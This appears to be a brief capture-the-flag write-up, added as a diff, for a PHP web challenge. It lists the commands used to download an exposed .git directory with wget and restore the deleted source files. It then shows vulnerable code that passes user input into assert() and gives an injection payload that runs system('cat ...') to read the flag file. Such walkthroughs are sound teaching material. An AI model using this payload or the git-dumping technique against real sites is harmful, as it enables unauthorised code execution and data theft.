@@ -1,0 +1,42 @@
+* Hint: 
+ - web build with: git, php, bootstrap
+ - ?page=flag
+ 
+* Check git disclosure:
+	http://111.200.241.244:57382/.git/
+	
+=> git disclosure
+
+* Download snapshot git to view source code
+	wget -r http://111.200.241.244:57382/.git/
+	
+- after download, check git status:
+	git status
+
+- some files are deleted -> restore:
+	git restore index.php
+	git restore templates
+
+* View source code
+- index.php:
+	if (isset($_GET['page'])) {
+		$page = $_GET['page'];
+	} else {
+		$page = "home";
+	}
+
+	$file = "templates/" . $page . ".php";
+
+	// I heard '..' is dangerous!
+	assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+
+	// TODO: Make this look nice
+	assert("file_exists('$file')") or die("That file doesn't exist!");
+
+=> assert() -> maybe command execution
+
+=> payload: '.system('cat templates/flag.php').'
+
+=> got flag
+
+ 
